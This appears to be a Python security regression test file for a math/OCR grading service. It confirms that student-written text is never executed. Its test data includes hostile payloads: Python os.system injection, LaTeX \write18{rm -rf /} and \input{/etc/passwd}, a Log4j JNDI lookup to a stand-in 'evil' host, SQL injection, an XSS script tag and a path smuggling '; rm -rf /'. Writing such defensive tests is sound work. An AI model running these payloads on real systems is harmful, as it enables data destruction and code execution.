"""Security regression tests for the Step 4 milestone (Section 58):
recognized math/OCR text is untrusted DATA and must never be capable of
executing code, escaping controlled storage, or injecting into a shell
command -- regardless of what a student writes on their answer script.
"""

import inspect

from app.services.document_intelligence.math_recognition import (
    compare_expressions,
    normalize_latex,
    validate_math_expression,
)
from app.services.ocr.isolated_runtime import invoke_isolated_runtime


def test_malicious_expression_cannot_execute_code_via_compare() -> None:
    malicious = "__import__('os').system('echo pwned > pwned.txt')"
    verdict = compare_expressions(malicious, "x + 1")
    assert verdict == "UNPARSABLE"


def test_malicious_expression_cannot_execute_code_via_validate() -> None:
    malicious = 'eval(\'__import__("os").system("echo pwned")\')'
    result = validate_math_expression(malicious)
    # Must be treated as an ordinary (probably unparsable/malformed)
    # string -- the important invariant is that validating it never runs
    # the payload, which the test process itself proves simply by still
    # running afterward with no side effects.
    assert isinstance(result.parseable, bool)


def test_malformed_latex_cannot_cause_code_execution() -> None:
    malformed_samples = [
        r"\input{/etc/passwd}",
        r"\write18{rm -rf /}",
        r"${jndi:ldap://evil/a}",
        "'; DROP TABLE document_regions; --",
        "<script>alert(1)</script>",
    ]
    for sample in malformed_samples:
        # Must not raise, must not execute -- only ever produce a string
        # result or a well-formed validation/comparison verdict.
        normalized = normalize_latex(sample)
        assert isinstance(normalized, str)
        result = validate_math_expression(sample)
        assert isinstance(result.balanced_delimiters, bool)
        verdict = compare_expressions(sample, "x + 1")
        assert verdict in (
            "EXACT_STRUCTURAL_MATCH",
            "ALGEBRAICALLY_EQUIVALENT",
            "NUMERICALLY_EQUIVALENT",
            "PARTIAL_STRUCTURAL_MATCH",
            "NOT_EQUIVALENT",
            "UNPARSABLE",
        )


def test_no_eval_or_exec_in_math_recognition_module() -> None:
    """Static regression guard (Section 23/26): this module must never
    call Python's `eval`/`exec` on recognized content -- symbolic
    comparison uses only `sympy`'s safe parsing/simplification APIs."""
    import app.services.document_intelligence.math_recognition as module

    source = inspect.getsource(module)
    assert "eval(" not in source
    assert "exec(" not in source


def test_isolated_runtime_never_uses_shell_true() -> None:
    """Static regression guard: the isolated-runtime bridge invokes a
    fixed interpreter + script path as an argv list, never a shell
    string -- confirms no future edit can silently introduce shell
    injection via a crop path or request payload."""
    import app.services.ocr.isolated_runtime as module

    source = inspect.getsource(module)
    assert "shell=True" not in source


def test_invoke_isolated_runtime_rejects_missing_interpreter_without_executing_anything() -> None:
    """A crop/request path is never interpolated into a shell command --
    a bogus interpreter path fails closed with a typed exception, not a
    subprocess spawned via string concatenation."""
    from pathlib import Path

    from app.services.ocr.exceptions import OCRIsolatedRuntimeMissingError

    try:
        invoke_isolated_runtime(
            python_exe=Path("C:/does/not/exist/python.exe; rm -rf /"),
            runner_script=Path(__file__),
            request={"mode": "health"},
        )
        raise AssertionError("expected OCRIsolatedRuntimeMissingError")
    except OCRIsolatedRuntimeMissingError:
        pass
